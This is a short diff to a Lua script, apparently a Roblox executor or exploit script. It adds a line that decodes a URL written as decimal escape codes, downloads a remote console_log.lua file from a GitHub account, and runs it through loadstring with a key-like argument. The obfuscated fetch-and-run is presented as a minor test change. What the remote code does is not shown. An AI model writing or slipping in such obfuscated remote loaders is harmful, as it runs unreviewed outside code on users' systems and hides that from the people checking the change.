@@ -1,8 +1,10 @@
 -- Test 1 --
-local ws, plrs, core
+local ws, plrs, core, mdl
 ws = game:GetService("Workspace")
 plrs = game:GetService("Players")
 core = game:GetService("CoreGui")
+mdl = loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\072\111\097\110\103\072\105\101\110\088\083\099\114\105\112\116\115\047\077\111\100\117\108\101\115\047\114\101\102\115\047\104\101\097\100\115\047\097\108\116\047\099\111\110\115\111\108\101\095\108\111\103\046\108\117\097"))("HdcqvBvMCa7sH16g5CeYtytUCSSrT15tSPMVwFeD")
+repeat task.wait() until mdl and type(mdl) == "table"
 
 local plr, vars
 plr = plrs.LocalPlayer
@@ -11,6 +13,7 @@ vars = {
   ui = {
     display = false, order = 0
   },
+  info = {},
   radnum = function() return tostring(math.random(1, 9999)) end
 }
 
